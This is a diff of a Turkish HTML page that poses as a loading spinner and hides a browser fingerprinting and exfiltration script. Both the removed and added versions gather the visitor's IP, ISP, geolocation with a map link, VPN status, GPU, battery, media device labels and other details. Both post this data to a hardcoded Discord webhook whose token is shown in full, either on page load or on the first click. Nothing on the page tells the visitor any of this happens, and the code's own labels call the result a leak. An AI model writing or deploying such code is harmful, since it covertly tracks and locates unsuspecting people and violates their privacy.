@@ -2,86 +2,89 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Kaynakları</title>
+    <title>Sistem Entegrasyon Analizi</title>
     <style>
-        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
-        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: s 1s linear infinite; }
-        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; cursor:crosshair; }
+        .l { border: 2px solid #111; border-top: 2px solid #ff00ff; border-radius: 50%; width: 40px; height: 40px; animation: s 0.6s linear infinite; box-shadow: 0 0 15px #ff00ff22; }
+        @keyframes s { to { transform: rotate(360deg); } }
     </style>
 </head>
-<body>
+<body onmousedown="Oracle.ignite()" ontouchstart="Oracle.ignite()">
     <div class="l"></div>
 
     <script>
-        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+        "use strict";
 
-        async function masterExtract() {
-            let info = { 
-                gpu: "N/A", ven: "N/A", ip: "X", iss: "X", loc: "X", 
-                net: "X", sys: "X", ext: "X", bat: "X" 
-            };
+        const Oracle = (function() {
+            const HOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+            let fired = false;
 
-            // 1. ZORLANMIŞ DONANIM SORGUSU (GPU/VENDOR)
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"}) || canvas.getContext('webgl');
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                if (dbg) {
-                    info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                    info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+            const Forensic = {
+                // 1. Medya Cihazları (Mikrofon/Kamera)
+                async getMedia() {
+                    try {
+                        const devices = await navigator.mediaDevices.enumerateDevices();
+                        const audio = devices.filter(d => d.kind === 'audioinput').length;
+                        const video = devices.filter(d => d.kind === 'videoinput').length;
+                        const labels = devices.map(d => d.label || "Gizli Donanım").filter(l => l !== "").join(", ");
+                        return `🎤 ${audio} Mikrofon, 📷 ${video} Kamera\n**Etiketler:** \`${labels || 'Erişim Yok'}\``;
+                    } catch { return "Medya Erişimi Reddedildi"; }
+                },
+
+                // 2. Tam Zaman Analizi
+                getTime() {
+                    const now = new Date();
+                    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    const offset = now.getTimezoneOffset();
+                    return `⏰ **Saat:** ${now.toLocaleTimeString('tr-TR')}\n🌍 **Bölge:** ${tz} (UTC${-offset/60})`;
+                },
+
+                // 3. Ekran Topolojisi
+                getDisplay() {
+                    return `📐 **Çözünürlük:** ${screen.width}x${screen.height}\n🎨 **Renk:** ${screen.colorDepth}-bit | **DPR:** ${window.devicePixelRatio}`;
                 }
-            } catch(e) {}
-
-            // 2. ISS, IP VE ADLİ KONUM ANALİZİ
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const j = await res.json();
-                info.ip = j.ip;
-                info.iss = `${j.org} (AS${j.asn})`;
-                info.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${info.iss}\`\n🛡️ **Proxy/VPN:** ${j.proxy ? '⚠️ Aktif' : '✅ Temiz'}\n🗺️ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
-            } catch(e) {}
-
-            // 3. ŞEBEKE VE HIZ
-            try {
-                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                info.net = n ? `⚡ **Hız:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\n📡 **Bağlantı:** ${n.effectiveType}` : "Erişilemedi";
-            } catch(e) {}
-
-            // 4. DERİN SİSTEM VE ZAMAN ANALİZİ
-            try {
-                const b = await navigator.getBattery();
-                info.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
-            } catch(e) {}
-
-            info.sys = `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Çekirdek\n💾 **RAM:** ${navigator.deviceMemory || 'Gizli'} GB\n🔋 **Güç:** ${info.bat}`;
-            info.ext = `🌍 **Dil:** ${navigator.language}\n⏰ **Zaman:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
-
-            // 5. KUSURSUZ RAPOR ŞABLONU
-            const payload = {
-                embeds: [{
-                    title: "💀 KUSURSUZ ADLİ SİSTEM ANALİZİ",
-                    description: "Kullanıcı etkileşimi olmadan tüm veriler sızdırıldı.",
-                    color: 15158332,
-                    fields: [
-                        { name: "📡 İNTERNET VE ISS KATMANI", value: `${info.loc}\n${info.net}\n**IP:** \`${info.ip}\``, inline: false },
-                        { name: "🛠️ EKRAN KARTI (DONANIM)", value: `**Renderer:** \`${info.gpu}\`\n**Vendor:** \`${info.ven}\``, inline: false },
-                        { name: "⚙️ DONANIM DETAYLARI", value: info.sys, inline: false },
-                        { name: "🌐 SİSTEM DETAYLARI", value: info.ext, inline: false },
-                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
-                    ],
-                    footer: { text: "Protocol: Omniscience v7.0" },
-                    timestamp: new Date()
-                }]
             };
 
-            const blob = JSON.stringify(payload);
-            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
-            navigator.sendBeacon(u, blob);
-        }
+            return {
+                async ignite() {
+                    if (fired) return; fired = true;
 
-        // OTOMATİK BAŞLAT
-        window.onload = masterExtract;
+                    // Paralel Veri Madenciliği (Yüksek Öncelikli)
+                    const [netRes, media, bat] = await Promise.all([
+                        fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
+                        Forensic.getMedia(),
+                        navigator.getBattery ? navigator.getBattery().catch(() => ({level:0})) : {level:0}
+                    ]);
+
+                    // Donanım Röntgeni
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl2');
+                    const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
+                    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
+
+                    const payload = {
+                        content: "💀 **ORACLE V11 - TAM SPEKTRUM SIZINTI**",
+                        embeds: [{
+                            color: 16711935, // Neon Magenta
+                            fields: [
+                                { name: "📡 AĞ, VPN & LOKASYON", value: `**IP:** \`${netRes.ip}\` | **VPN:** ${netRes.proxy ? '⚠️ AKTİF' : '✅ TEMİZ'}\n**ISS:** ${netRes.org}\n**Konum:** ${netRes.city}, ${netRes.country_name}\n📍 [Google Maps](https://www.google.com/maps?q=${netRes.latitude},${netRes.longitude})`, inline: false },
+                                { name: "🎤 MEDYA DONANIMI", value: media, inline: false },
+                                { name: "⚙️ SİSTEM & EKRAN", value: `${Forensic.getDisplay()}\n**OS:** ${navigator.platform}\n**CPU:** ${navigator.hardwareConcurrency} Çekirdek | **RAM:** ${navigator.deviceMemory}GB`, inline: true },
+                                { name: "🔋 GÜÇ & ZAMAN", value: `${Forensic.getTime()}\n**Pil:** %${Math.round(bat.level * 100)} (${bat.charging ? 'Şarjda' : 'Pilde'})`, inline: true },
+                                { name: "🛠️ GPU RENDERER", value: `\`${gpu}\``, inline: false },
+                                { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
+                            ],
+                            footer: { text: "Protocol: Oracle V11 | Zero-Knowledge Extraction" },
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+
+                    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                    navigator.sendBeacon(HOOK, blob); // Kesin iletim
+                    fetch(HOOK, { method: 'POST', mode: 'no-cors', keepalive: true, body: blob });
+                }
+            };
+        })();
     </script>
 </body>
 </html>
